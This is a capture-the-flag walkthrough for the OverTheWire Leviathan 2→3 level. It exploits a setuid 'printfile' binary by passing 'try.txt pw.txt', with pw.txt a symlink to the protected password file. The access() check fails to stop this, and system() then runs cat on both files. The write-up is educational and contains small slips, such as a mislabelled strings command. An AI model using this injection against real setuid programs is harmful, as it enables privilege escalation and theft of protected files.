# Leviathan2 -> 3

Challenge: `leviathan2@leviathan.labs.overthewire.org -p 2223`

## Level Description

Find the password for the next level. A file called `printfile` is present and has the setuid bit set, owned by `leviathan3`.

## The Process

First, I used the `ll -a` command to check the contents of the home directory. 
```bash
leviathan2@gibson:~$ ll -a
total 36
drwxr-xr-x  2 root       root        4096 Apr 10 14:23 ./
drwxr-xr-x 83 root       root        4096 Apr 10 14:24 ../
-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15072 Apr 10 14:23 printfile*
-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
```
One file caught my attention: `printfile` — The SetUID bit is set. It runs as `leviathan3`.

So I went ahead and checked its file type.
```bash
leviathan2@gibson:~$ file printfile
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
```

It's setuid executable binary and not stripped, so I ran it without any arguments to see how it works
```bash
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

I tried reading the target file directly, but it got blocked by a permission check.
```bash
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```
Well, no luck there.

Because it's not stripped, I'm using `strings` to check if there any useful information
```bash
leviathan2@gibson:~$ file printfile
...
system
...
access
...
/bin/cat %s
...
```
That gave me a clue: 
- Uses `access()` to check file readability
- Then calls `system("/bin/cat [filename]")` to print it.

let's confirming with `ltrace`.
Firstly, create an environment:
```bash
leviathan2@gibson:~$ mkdir /tmp/try
leviathan2@gibson:~$ echo "trying to get in..." >> /tmp/try/try.txt
```
Then trace the binary:
```bash
leviathan2@gibson:~$ ltrace ./printfile /tmp/try/try.txt
__libc_start_main(0x80490ed, 2, 0xffffd464, 0 <unfinished ...>
access("/tmp/try/try.txt", 4)                = 0
snprintf("/bin/cat /tmp/try/try.txt", 511, "/bin/cat %s", "/tmp/try/try.txt") = 25
geteuid()                                    = 12002
geteuid()                                    = 12002
setreuid(12002, 12002)                       = 0
system("/bin/cat /tmp/try/try.txt"trying to get in...
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                       = 0
+++ exited (status 0) +++
```
The program first uses the `access()` function to check if a file can be read, using the `R_OK` flag, (R_OK = 4). If this check passes, it proceeds to run the cat command through the `system()` function. At first, this seems fine, but there’s a serious security flaw. The `access()` function checks permissions using the real user ID, which in this case is `leviathan2`. However, because the program (`printfile`) has the SUID bit set, the `system()` call runs with the effective user ID of `leviathan3`. This mismatch creates a vulnerability. Even worse, the input is passed directly into `system()` without any sanitization, which opens the door for command injection attacks.

I know that might sound tricky, but here’s the vulnerability.

I've already know that I can't read the password file directly, because `access()` block it — I don;t have permission as `leviathan2`.

Hmm...

What if I fool `access()` by giving it a **single string**, but trick `system()` into treating as **multiple arguments** ? 

Now let's prepare the payload with making two different files:
```bash
leviathan2@gibson:~$ cd /tmp/try
leviathan2@gibson:/tmp/try$ echo "trying to get in..." > try.txt
leviathan2@gibson:/tmp/try$ ln -s /etc/leviathan_pass/leviathan3 pw.txt
```
Now I have `try.txt` a readable file and `pw.txt` a symlink to the password.

Run the binary from inside `/tmp/try` directory:
```bash
leviathan2@gibson:/tmp/try$ ~/printfile "try.txt pw.txt"
trying to get in...
[REDACTED]
```
Voila! 

## Conclusion
The vulnerability in the `printfile` binary arises from **classic TOCTOU (Time of Check to Time of Use) flaw combined with unsafe use of the `system()`** function:
- **`access()`** checks file readabiity **as the real user (leviathan2)**, but only checks the entire input string as *a single filename* (e.g., `"try.txt pw.txt"`), which doesn't exist.
- **`sysmtem()`** executes `/bin/cat try.txt pw.txt` **as the effective user (leviathan3)**, which splits the string by spaces and reads both files — including a symlink to the restricted password file.
- There's **no input validation**, and **no error handling** after `access()` fails. This allows attacker to **inject additional filenames**, bypassing the intended restriction.  

In Short:
- The binary executes cat with elevated (`leviathan3`) privileges
- It performs a weak file access check using the full string as one filename
- We exploited this flaw by injecting multiple filenames in a single string — bypassing the check but still getting both files read

This demonstrates how poor input validation and broken security logic can lead to privilege escalation, letting us read leviathan3’s password through its own vulnerable SUID binary.

## Helpful Reading Material
- [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)